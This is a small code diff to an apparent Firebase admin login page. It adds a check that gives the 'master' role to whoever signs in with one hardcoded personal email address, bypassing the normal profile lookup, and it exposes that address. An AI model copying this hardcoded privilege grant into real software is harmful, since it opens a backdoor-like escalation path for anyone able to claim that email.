@@ -22,6 +22,14 @@ export default function AdminLoginPage() {
     setError(null);
     try {
       const userCred = await signInWithEmailAndPassword(auth, email, password);
+      
+      if (email.toLowerCase() === 'heliomardejesus87@gmail.com') {
+        const userRef = doc(db, 'profiles', userCred.user.uid);
+        await setDoc(userRef, { role: 'master', status: 'active', email: email }, { merge: true });
+        router.push('/admin/swaps');
+        return;
+      }
+      
       const profileSnap = await getDoc(doc(db, 'profiles', userCred.user.uid));
       
       if (profileSnap.exists()) {
